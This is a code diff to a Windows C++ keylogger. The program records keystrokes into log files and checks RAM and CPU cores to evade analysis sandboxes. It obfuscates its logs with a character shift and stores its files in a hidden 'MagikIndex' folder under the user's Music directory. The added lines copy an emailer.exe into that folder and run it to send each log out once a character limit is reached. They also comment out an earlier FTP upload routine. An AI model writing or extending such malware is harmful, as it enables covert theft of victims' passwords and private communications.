@@ -15,6 +15,7 @@
 #pragma warning( push )
 #pragma warning( disable : 4477 )
 
+#define CRLF "\r\n"
 
 typedef std::string String;
 typedef std::vector<String> StringVector;
@@ -24,14 +25,21 @@ typedef unsigned long long uint64_t;
 #define Password ""
 #define MyServer ""
 
-#define CharactersPerLog 5000
+#define CharactersPerLog 300
 #define MaximumFolderSize 10 
 #define RequiredRam 2048 //MB
 #define RequiredCores 2 
 #define CryptPassword "MyPassword" 
 #define BaseShiftValue 100 //base int to add to chars for crypting measures
 
+
 #define MAX_LENGTH 1024
+
+
+#ifndef ARRAY_SIZE
+#define ARRAY_SIZE(X) (sizeof(X) / sizeof(*X))
+#endif
+
 
 
 #define WINDOWS_SLID                                                \
@@ -52,7 +60,10 @@ typedef unsigned long long uint64_t;
 FILE* OUTPUT_FILE;
 
 
+
+
 extern "C" int RandomGenerator();
+
 
 int ExtrapolateKey() {
 
@@ -195,7 +206,7 @@ void LogItInt(int key_stroke,std::string FileName) {
     fclose(OUTPUT_FILE);
 }
 
-
+/*
 void FileSubmit(const char* localfile, const char* remotefile)
 {
     HINTERNET hInternet;
@@ -220,7 +231,7 @@ void FileSubmit(const char* localfile, const char* remotefile)
         }
     }
 }
-
+*/
 
 void LogItChar(std::string Value, std::string FileName) {
 #ifndef debug
@@ -330,6 +341,7 @@ Log:
     std::string RAMText = "RAM Size:";
     std::string SeedText = "Randomness Seed:";
     std::string CopiedFileText = "Made executable \"";
+    std::string CryptText = "Encrypted with \"";
 
     char* AppData = nullptr;
     size_t AppDataSize;
@@ -381,6 +393,9 @@ Log:
 #else
 
     LogItChar("Started in normal mode...", CurrentLog);
+    CryptText += std::to_string(ExtrapolateKey());
+    CryptText += "\" Key Shift...";
+    LogItChar(CryptText, CurrentLog);
 
 #endif
 
@@ -421,6 +436,11 @@ Log:
         DestinationFile += UserName;
         DestinationFile += "\\Music\\MagikIndex";
 
+
+        CreateDirectoryA(DestinationFile.c_str(), NULL);
+
+        SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
+
         if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
             std::string Command = "/C del /f /q ";
             Command += DestinationFile;
@@ -430,10 +450,13 @@ Log:
             Sleep(200);
         }
 
-        CreateDirectoryA(DestinationFile.c_str(), NULL);
-
-        SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
-
+        std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
+        std::string EmailerPath = std::string(PathToFile).substr(0, pos);
+        EmailerPath += "\\emailer.exe";
+        std::string EmailerDestination = DestinationFile;
+        EmailerDestination += "\\emailer.exe";
+        CopyFileA(EmailerPath.c_str(), EmailerDestination.c_str(), false);
+        LogItChar("Copied emailer.exe...", CurrentLog);
         DestinationFile += "\\";
 
         std::string CopiedFile;
@@ -664,6 +687,13 @@ Log:
      RemoteFile += ".txt";
      FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
      */
+
+     LogItChar("\n_____________________________________________", CurrentLog);
+     LogItChar("Character limit hit, sending log...",CurrentLog);
+
+     std::string Emailer = "emailer.exe ";
+     Emailer += CurrentLog;
+     system(Emailer.c_str());
 
      FirstLog = false;
 
